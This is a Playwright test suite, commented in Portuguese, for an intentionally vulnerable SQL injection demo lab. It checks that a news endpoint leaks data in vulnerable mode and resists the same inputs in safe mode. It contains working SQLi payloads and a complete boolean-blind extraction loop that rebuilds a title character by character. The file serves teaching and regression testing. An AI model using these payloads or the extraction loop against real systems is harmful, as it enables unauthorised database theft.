import { expect, test } from '@playwright/test';

/**
 * Cenarios 1 a 3 - SQLi, verificados pelo canal que o roteiro usa.
 *
 * A suite de aceitacao (T04, T05, T06) ja cobre o mesmo terreno pelo lado do
 * servidor, e o DAS manda o publico colar as URLs na barra de endereco. O que
 * faltava era um teste que passasse pelas MESMAS URLs, com a mesma resposta
 * observavel na tela, para o comportamento que se apresenta na palco estar
 * trancado por automacao.
 *
 * O oraculo e o ponto: em /banco/noticia a resposta e so 200 ou 404, sem corpo
 * que diferencie. Um teste que so conferisse status nao diria nada; o que
 * separa o ataque de uma sonda e a COMPARACAO com o texto base. Por isso quase
 * toda asserted aqui e relativa a 'Uma noticia qualquer e sempre a mesma.'.
 */

/** Noticia que existe no init.sql, para servir de linha de base. */
const CONTEUDO_BASE =
  'O FinBank lancerou uma linha de credito com taxa reduzida para clientes pessoa juridica.';
const TITULO_BASE = 'FinBank anuncia nova linha de credito';

/** Mensagem fixa de 404, igual nos dois modos. */
const ERRO_404 = 'Noticia nao encontrada.';

test.describe('SQLi - o oraculo 200/404 do cenario 3', () => {
  test.beforeEach(async ({ request }) => {
    const resposta = await request.post('/api/reset');
    expect(resposta.ok()).toBeTruthy();
    await request.post('/api/mode', { data: { mode: 'vuln' } });
  });

  test('a linha de base responde 200 com a noticia', async ({ request }) => {
    const resposta = await request.get('/banco/noticia?id=1');

    expect(resposta.status()).toBe(200);
    expect((await resposta.json()).noticia.conteudo).toBe(CONTEUDO_BASE);
  });

  test('id inexistente responde 404: o 404 e do oraculo, nao do MySQL', async ({ request }) => {
    const resposta = await request.get('/banco/noticia?id=999999');

    expect(resposta.status()).toBe(404);
    expect((await resposta.json()).erro).toBe(ERRO_404);
  });

  /**
   * Malformado (DAS 4.3.2): a aspa fecha a string e o resto vira erro de
   * sintaxe se chegar ao MySQL. Por caminhos diferentes, os dois modos devolvem
   * 404 em vez de 500.
   *
   * No modo vulneravel a rota suprime o erro de proposito, para que o oraculo
   * continue sendo so 200/404. No modo seguro a aspa nem chega ao SQL: o id
   * passa por validacao de formato antes da consulta e cai no 404 de "nao
   * encontrada". Em nenhum dos casos o oraculo vira canal de fuga de informacao.
   */
  test("a aspa solta produz 404, e nao 500, nos dois modos", async ({ request }) => {
    const malformado = await request.get(`/banco/noticia?id=${encodeURIComponent("'")}`);
    expect(malformado.status()).toBe(404);

    await request.post('/api/mode', { data: { mode: 'safe' } });
    const seguro = await request.get(`/banco/noticia?id=${encodeURIComponent("'")}`);
    expect(seguro.status()).toBe(404);
  });

  /**
   * Inferencial booleano (DAS 4.3.1). O par `' OR 1=1 -- ` e `' AND 1=2 -- `
   * muda o resultado da consulta para verdadeiro e falso sem jamais escrever a
   * palavra SELECT. Se os dois dessem a mesma resposta, a extracao seria
   * impossivel e o laboratorio estaria quebrado.
   */
  test('o par verdadeiro/falso separa a resposta do oraculo', async ({ request }) => {
    const verdadeiro = await request.get(
      `/banco/noticia?id=${encodeURIComponent("' OR 1=1 -- ")}`,
    );
    const falso = await request.get(
      `/banco/noticia?id=${encodeURIComponent("' AND 1=2 -- ")}`,
    );

    expect(verdadeiro.status()).toBe(200);
    expect(falso.status()).toBe(404);
  });

  /**
   * O operador OR tautologico: a condicao vale para qualquer linha, entao a
   * resposta e 200.
   *
   * O teste NAO pode afirmar qual noticia volta. A tabela e um heap InnoDB e o
   * init.sql faz DROP + INSERT a cada reset, entao a ordem de varredura nao
   * segue o id: o que a rota devolve e rows[0], a primeira linha que o
   * planejador encontrar. O contrato do cenario e o status, nao a linha.
   */
  test('o operador OR tautologico traz alguma noticia', async ({ request }) => {
    const resposta = await request.get(
      `/banco/noticia?id=${encodeURIComponent("' OR 1=1 -- ")}`,
    );

    expect(resposta.status()).toBe(200);
    expect((await resposta.json()).noticia).toBeTruthy();
  });

  /**
   * A extracao caractere a caractere, passo a passo do roteiro.
   *
   * O detalhe que faz este teste funcionar, e que o DAS nao deixa explicito: a
   * condicao injetada e avaliada em TODAS as linhas da tabela, nao so na linha
   * do id pedido. Sem um filtro de escopo, a primeira letra que casar com
   * qualquer titulo da tabela encerra a busca -- e como varios titulos comecam
   * com a mesma letra, a extracao comeca a devolver lixo.
   *
   * Por isso o probe carrega `(id='1' AND SUBSTRING(...))`: o `OR` neutraliza
   * a `id = ''` que sobrou da aspa de abertura, e o `AND` restringe a
   * subcondicao a linha que estamos atacando. A resposta 200 passa a significar
   * "aquele caractere esta na posicao pedida daquela linha".
   *
   * O `OR` e obrigatorio e o `AND` sozinho nao funciona: `id='' AND ...` nao
   * tem como ser verdadeiro, porque nenhuma linha tem id vazio.
   */
  test('a extracao caractere a caractere reconstroi o titulo', async ({ request }) => {
    // A extracao faz ate ~3.100 requisicoes em serie (um alfabeto de ~95
    // caracteres por posicao do titulo). O timeout padrao de 30s nao cobre esse
    // volume numa maquina carregada, e o teste precisa terminar com o diff da
    // assertao final, nao com um timeout estourando no meio do laco.
    test.setTimeout(180_000);

    const ALFABETO =
      ' !"#$%&\'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~';

    let extraido = '';

    for (let posicao = 1; extraido.length < TITULO_BASE.length; posicao += 1) {
      let achou = false;

      for (const caractere of ALFABETO) {
        const probe =
          `' OR (id='1' AND SUBSTRING(titulo,${posicao},1)='${caractere}') -- `;
        const resposta = await request.get(
          `/banco/noticia?id=${encodeURIComponent(probe)}`,
        );

        if (resposta.status() === 200) {
          extraido += caractere;
          achou = true;
          break;
        }
      }

      // Caractere fora do alfabeto testado, ou titulo menor que o esperado:
      // parar e deixar a assertao final reprovar com o diff, que e mais
      // util do que um timeout dentro do laco.
      if (!achou) {
        break;
      }
    }

    // A comparacao em MySQL usa a collation das colunas, `utf8mb4_0900_ai_ci`:
    // o `ai` significa case- e accent-insensitive. O oraculo responde 200 para
    // 'F' e tambem para 'f', entao o ataque NAO consegue recuperar o caixa
    // real do dado -- e o que volta e a versao que o alfabeto do teste
    // experimentou primeiro, e o alfabeto comeca nas maiusculas.
    //
    // Isso e limitacao real da tecnica, nao bug do laboratorio, e por isso a
    // asserted compara sem caixa. Apagar a diferenca aqui esconderia o que a
    // plateia precisa saber: dado extraido por inferencia em coluna com
    // collation ci chega sem o caixa original, e nao serve para comparar
    // senha ou hash em tempo logico.
    expect(extraido).toBeTruthy();
    expect(extraido.toUpperCase()).toBe(TITULO_BASE.toUpperCase());
  });

  /**
   * O lado do ataque, para quem quiser o dado exato: `BINARY` troca a comparacao
   * por bytes e o oraculo volta a distinguir maiuscula de minuscula.
   *
   * O mesmo par de operadores que antes era indistinguivel agora separa os
   * dois casos, e e por ai que a defesa correta nao e "esconder o resultado" e
   * sim prepared statement mais uma collation binaria onde o caso importa.
   */
  test('com BINARY a comparacao volta a distinguir maiuscula de minuscula', async ({ request }) => {
    const maiuscula = await request.get(
      `/banco/noticia?id=${encodeURIComponent(
        `' OR (id='1' AND BINARY SUBSTRING(titulo,1,1)='F') -- `,
      )}`,
    );
    const minuscula = await request.get(
      `/banco/noticia?id=${encodeURIComponent(
        `' OR (id='1' AND BINARY SUBSTRING(titulo,1,1)='f') -- `,
      )}`,
    );

    expect(maiuscula.status()).toBe(200);
    expect(minuscula.status()).toBe(404);
  });

  test('modo seguro: os mesmos payloads param a ser injetados', async ({ request }) => {
    await request.post('/api/mode', { data: { mode: 'safe' } });

    for (const payload of ["' OR 1=1 -- ", "' AND 1=2 -- ", "'", "' OR '1'='1"]) {
      const resposta = await request.get(
        `/banco/noticia?id=${encodeURIComponent(payload)}`,
      );
      // Sem a tautologia nao ha linha para trazer, e o id malformado tambem
      // nao casa com nenhum: nos dois casos o oraculo responde a mesma coisa.
      expect(resposta.status()).toBe(404);
    }
  });

  test('modo seguro: a noticia legitima continua sendo servida', async ({ request }) => {
    await request.post('/api/mode', { data: { mode: 'safe' } });

    const resposta = await request.get('/banco/noticia?id=1');

    expect(resposta.status()).toBe(200);
    expect((await resposta.json()).noticia.conteudo).toBe(CONTEUDO_BASE);
  });
});
